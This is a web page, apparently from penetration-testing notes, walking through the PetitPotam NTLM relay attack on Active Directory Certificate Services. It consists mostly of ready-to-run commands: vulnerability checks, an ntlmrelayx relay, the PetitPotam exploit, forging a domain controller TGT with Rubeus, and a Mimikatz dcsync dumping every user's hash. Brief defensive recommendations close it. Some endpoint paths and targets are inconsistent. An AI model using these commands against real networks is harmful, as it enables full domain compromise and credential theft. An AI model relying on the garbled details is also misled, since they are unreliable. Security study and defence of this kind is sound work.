---
layout: default
title: PetitPotam [CVE-2022-26925]
parent: Active Directory
nav_order: 12
permalink: /ad/petitpotam/
---

# PetitPotam [CVE-2022-26925]
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

PetitPotam is a NTLM relay attack, allowing an attacker to force NTLM authentication on a Domain Controller. The Domain Controller’s NTLM hash is then relayed to the Active Directory Certificate Services server on the Certificate Authority Web Enrollment endpoint to ask for a new certificate. This certificate can be used to request a Kerberos TGT associated to the Domain Controller’s account, allowing the attacker to gain enough permissions to totally compromise the domain.

## Prerequisites

- Low privileged domain account (if domain is correctly patched, **the attack can be performed unauthenticated otherwise**).
- AD CS (Active Directory Certificate Services) with the Certificate Authority Web Enrollment enabled and accepting NTLM authentication.

To check if a domain controller is vulnerable to PetitPotam, use CME appropriate module.

```bash
# Check PetitPotam vulnerability unauthenticated
cme smb $DC_IP -M petitpotam

# Check PetitPotam vulnerability as an authenticated domain user
cme smb $DC_IP -u $USERNAME -p $PASSWORD -M petitpotam
```

You know must found the AD CS server to check if the Certificate Authority Web Enrollment is enabled. There are multiple ways to do that:

- Network scans.
- Active Directory enumeration, looking for `ACDS`-like named computers.
- Fuzzing on `/certsrv/` endpoint.
- Using `certutil.exe`

The Certificate Authority Web Enrollment endpoint is accessible by clicking on `Request a certificate`, usually located at `/cert/certrqus.asp`.

## Exploit

In a terminal, start an NTLM relay to the AD CS server. It will automatically relay any NTLM request to the destination specified with `-t` option.

```bash
impacket-ntlmrelayx -t http://$DC_IP/certsrv/certqus.asp -smb2support --adcs --template DomainController
```

To exploit PetitPotam vulnerability, use the following GitHub repository to exploit it. The retrieved NTLM hash of the Domain Controller’s account will be forwarded to the AD CS server thanks to the NTLM relay started before.

https://github.com/topotam/PetitPotam

```bash
python PetitPotam.py -d $DOMAIN -u $USERNAME -p $PASSWORD $LHOST $DC_IP
```

On the NTLM relay terminal, you should receive a base64 formatted certificate. You can use it to request a Kerberos TGT with Rubeus.

```bash
# With Win+R, to avoid conflicts with your current Kerberos context.
runas /netonly /user:fake powershell

# Then, use Rubeus to extract. Don't forget to put a '$' at the end of the DC account.
.\Rubeus.exe asktgt /outfile:kirbi /user:$DC_ACCOUNT /ptt /certificate:$CERTIFICATE

# Verify the Kerberos TGT is loaded in the session
klist
```

With a Kerberos TGT associated to the Domain Controller’s account, you are now able to fully compromise the Domain. For example, you can extract all NTLM hashes of every domain user with Mimikatz. These hashes can then be cracked offline, or you can perform Pass-the-Hash to authenticated anywhere as a Domain Administrator.

```bash
# Extract NTLM hashes of every domain user with Mimikatz
.\Mimikatz.exe "lsadump::dcsync"
```

## Recommendations

Microsoft is aware of this vulnerability, but no official security patch has been released to correct it. Various Microsoft recommendations already exist to protect Domain Controllers against NTLM relay attacks.

- [ ]  Update domain controllers to the latest Microsoft security patches to ensure PetitPotam isn’t exploitable unauthenticated.
- [ ]  Disable the Certificate Authority Web Enrollment endpoint, or at least the NTLM authentication on it to avoid NTLM relay on it.
- [ ]  Disable NTLM authentication on the Domain to enforce Kerberos usage (**it could have impacts on applications that does not support Kerberos authentication**).
- [ ]  Apply Microsoft recommendations described in [KB5005413](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429).